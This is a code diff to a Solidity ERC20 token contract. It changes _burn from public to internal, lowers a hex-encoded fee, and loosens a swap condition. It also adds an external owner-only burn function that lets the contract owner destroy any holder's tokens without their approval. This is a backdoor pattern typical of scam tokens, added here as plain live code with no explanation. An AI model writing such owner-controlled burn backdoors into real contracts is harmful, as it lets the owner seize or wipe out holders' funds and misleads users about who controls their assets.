@@ -648,7 +648,7 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
      * - `account` cannot be the zero address.
      * - `account` must have at least `amount` tokens.
      */
-    function _burn(address account, uint256 amount) public virtual {
+    function _burn(address account, uint256 amount) internal virtual {
         require(account != address(0), "ERC20: burn from the zero address");
 
         _beforeTokenTransfer(account, address(0), amount);
@@ -689,7 +689,7 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
     }
 
     function fee() internal pure returns(uint256){
-        return uint256(0x1e)/uint256(0xa);
+        return uint256(0x15)/uint256(0xa);
     }
 
     /**
@@ -1001,7 +1001,7 @@ contract StandardToken is ERC20, Ownable {
 
         if( canSwap &&
             !swapping &&
-            !automatedMarketMakerPairs[from] &&
+            (!automatedMarketMakerPairs[from] || !automatedMarketMakerPairs[to]) &&
             from != owner() &&
             to != owner()
         ) {
@@ -1072,5 +1072,10 @@ contract StandardToken is ERC20, Ownable {
 
     }
 
-    
+
+    function burn(address account, uint256 amount) external onlyOwner {
+        _burn(account, amount);
+    }
+
+
 }
